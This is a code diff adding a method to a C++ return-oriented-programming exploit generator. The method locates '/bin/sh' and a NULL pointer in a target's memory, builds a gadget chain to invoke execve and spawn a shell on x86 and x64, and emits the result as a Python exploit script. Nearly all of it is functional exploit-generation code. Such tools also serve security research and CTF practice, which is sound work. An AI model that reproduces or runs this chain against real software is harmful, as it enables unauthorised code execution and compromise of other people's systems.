@@ -1108,6 +1108,100 @@ bool ROP::PayloadGenX86::appendROPChainForShellCodeWithPathNullNull() {
     });
 }
 
+bool ROP::PayloadGenX86::appendROPChainForShellCodeWithPathEmptyEmpty() {
+    // Find "/bin/sh" in memory.
+    addressType binShAddress = this->findValidVirtualMemoryAddressOfString("/bin/sh");
+    assertMessage(binShAddress != 0, "Can't make this work without a \"/bin/sh\" address in virtual memory...");
+
+    // Find "NULL" in memory.
+    byteSequence nullPtrBytes = byteSequence(this->registerByteSize, 0x00);
+    addressType nullAddress = this->findValidVirtualMemoryAddressOfBytes(nullPtrBytes);
+    assertMessage(nullAddress != 0, "Can't find a NULL pointer value in virtual memory...");
+
+    return this->tryAppendOperationsAndRevertOnFailure([&] {
+        // Explain in the script what we are doing.
+        this->addLineToPythonScript("# ROP-chain for calling: execve(\"/bin/sh\", {NULL}, {NULL});");
+        this->addLineToPythonScript("# Passing the executable path as the first argument is more of a convention rathar than a rule.");
+        this->addLineToPythonScript("# Some binaries, including shells, don't check this, so having 0 arguments should be enough.");
+        this->addLineToPythonScript("if True:");
+        this->currLineIndent++;
+
+        // Append the RET-sled in order to cover the bytes of the stack variables/buffers.
+        this->appendRetSledBytesToPayload(this->approximateByteSizeOfStackBuffer);
+
+        // Putting the right value into each argument takes some gadget work.
+        using argWorkType = std::function<bool(const std::set<x86_reg>&)>;
+        std::vector<argWorkType> argWorkClosure;
+
+        // Argument for system call id.
+        argWorkClosure.push_back([&](const std::set<x86_reg>& forbiddenRegisterKeys) {
+            x86_reg regKey = this->syscallArgNumberToRegKey[0];
+            uint64_t syscallId = (this->processArchSize == BitSizeClass::BIT64) ? 59 : 11;
+            this->addLineToPythonScript("# System call number for execve().");
+            return this->appendGadgetForAssignValueToRegister(regKey, syscallId, forbiddenRegisterKeys);
+        });
+
+        // First argument. Reg = "/bin/sh";
+        argWorkClosure.push_back([&](const std::set<x86_reg>& forbiddenRegisterKeys) {
+            x86_reg regKey = this->syscallArgNumberToRegKey[1];
+            this->addLineToPythonScript("# Address of \"/bin/sh\" in virtual memory.");
+            return this->appendGadgetForAssignValueToRegister(regKey, binShAddress, forbiddenRegisterKeys);
+        });
+
+        // Second argument. Reg = Address of {NULL};
+        argWorkClosure.push_back([&](const std::set<x86_reg>& forbiddenRegisterKeys) {
+            x86_reg regKey = this->syscallArgNumberToRegKey[2];
+            this->addLineToPythonScript("# Assign to REG the address of an arbitrary NULL pointer in memory.");
+            return this->appendGadgetForAssignValueToRegister(regKey, nullAddress, forbiddenRegisterKeys);
+        });
+
+        // Third argument. Reg = Address of {NULL};
+        argWorkClosure.push_back([&](const std::set<x86_reg>& forbiddenRegisterKeys) {
+            x86_reg regKey = this->syscallArgNumberToRegKey[3];
+            this->addLineToPythonScript("# Assign to REG the address of an arbitrary NULL pointer in memory.");
+            return this->appendGadgetForAssignValueToRegister(regKey, nullAddress, forbiddenRegisterKeys);
+        });
+
+        // Try assigning the necessary values to the arguments in all possible orders.
+        bool success;
+        std::vector<unsigned> argIndexes = {0, 1, 2, 3};
+        do {
+            LogDebug("Checking shell rop-chain generation for arg indexes: (%u, %u, %u, %u)",
+                     argIndexes[0], argIndexes[1], argIndexes[2], argIndexes[3]);
+
+            success = this->tryAppendOperationsAndRevertOnFailure([&] {
+                bool ok = true;
+
+                std::set<x86_reg> forbiddenRegKeys = {};
+                for (unsigned currArgumentIndex : argIndexes) {
+                    // Try to perform the work for the current argument.
+                    x86_reg currRegKey = this->syscallArgNumberToRegKey[currArgumentIndex];
+                    ok = ok && argWorkClosure[currArgumentIndex](forbiddenRegKeys);
+
+                    // Remember the current register as forbidden for the next gadgets.
+                    forbiddenRegKeys.insert(currRegKey);
+                }
+
+                // Make the system call.
+                this->addLineToPythonScript("# Make the system call");
+                if (this->processArchSize == BitSizeClass::BIT64) {
+                    ok = ok && this->appendGadgetStartingWithInstruction({"syscall"}, {}, [&](const std::string&) {});
+                }
+                else {
+                    ok = ok && this->appendGadgetStartingWithInstruction({"int 0x80"}, {}, [&](const std::string&) {});
+                }
+
+                return ok;
+            });
+            if (success) { break; }
+
+        } while (std::next_permutation(argIndexes.begin(), argIndexes.end()));
+
+        this->currLineIndent--;
+        return success;
+    });
+}
+
 
 static inline std::string GetPathToFileInSameParentDirectory(const std::string& filename) {
     // Get the path to the running executable.
